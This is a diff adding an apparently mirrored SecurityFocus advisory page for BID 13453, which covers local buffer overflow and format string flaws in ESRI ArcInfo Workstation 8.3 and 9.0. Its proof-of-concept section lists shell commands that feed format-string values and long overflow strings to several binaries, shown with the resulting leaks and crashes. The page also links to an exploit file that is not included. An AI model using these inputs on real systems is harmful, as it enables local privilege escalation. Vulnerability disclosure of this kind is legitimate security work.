@@ -1,0 +1,103 @@
+#SpeeDr00t@Black Falcon<br>#bid13453<p><b><span style="font-size: 18pt;">ESRI ArcInfo Workstation Multiple Local Buffer Overflow And Format String Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13453/info">info</a><br><a href="http://www.securityfocus.com/bid/13453/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13453/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13453/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13453/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13453
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-1393<br/>
+				
+					CVE-2005-1394<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 30 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 02:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Kevin Finisterre.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ESRI ArcInfo Workstation on UNIX 9.0 <br/>
+					
+				
+					ESRI ArcInfo Workstation on UNIX 8.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x14000/13453/ex_arcgis.c">#exploit_ex_arcgis.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof-of-concept examples were provided:<br/><br/>-bash-2.05b$ export                                                                                                                             <br/>ARCHOME=AAAABBBB%x.%x.%x.%x                                                                                                                     <br/> <br/>-bash-2.05b$ ./wservice                                                                                                                         <br/>Can not find or access                                                                                                                          <br/>AAAABBBB7ffffc00.2a078.9e39c.241 - wservice not run!                                                                                            <br/> <br/>-bash-2.05b# export ARCHOME=%x.%x.%x.%x                                                                                                         <br/>-bash-2.05b# ./lockmgr                                                                                                                          <br/>Can not find or access 7ffffc00.2a15c.9e39c.36 - lockmgr not run!                                                                               <br/> <br/>-bash-2.05b#  ./asmaster `perl -e 'print "A" x 2285'` b                                                                                         <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/> <br/>-bash-2.05b# ./asuser `perl -e 'print "A" x 694'` a a a                                                                                         <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/> <br/>-bash-2.05b# ./asutility DBDEF REMOVE `perl -e 'print "A" x 701'`                                                                               <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/> <br/>-bash-2.05b# ./asutility RMDB `perl -e 'print "A" x 1865'`                                                                                      <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/> <br/>-bash-2.05b# ./asutility CHECKDBIDS AVAILABLE `perl -e 'print "A" x                                                                             <br/>804'`                                                                                                                                           <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/> <br/>-bash-2.05b# ../bin/se `perl -e 'print "A" x 1278'`                                                                                             <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/> <br/>-bash-2.05b# ./asrecovery  `perl -e 'print "A" x 1987'` a a a                                                                                   <br/>FATAL ERROR                                                                                                                                     <br/>Segment Violation                                                                                                                               <br/><br/>Exploit code was also released for the 'wservice' format string vulnrability.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/ex_arcgis.c">/data/vulnerabilities/exploits/ex_arcgis.c</a></li>
+</ul>
+</div>
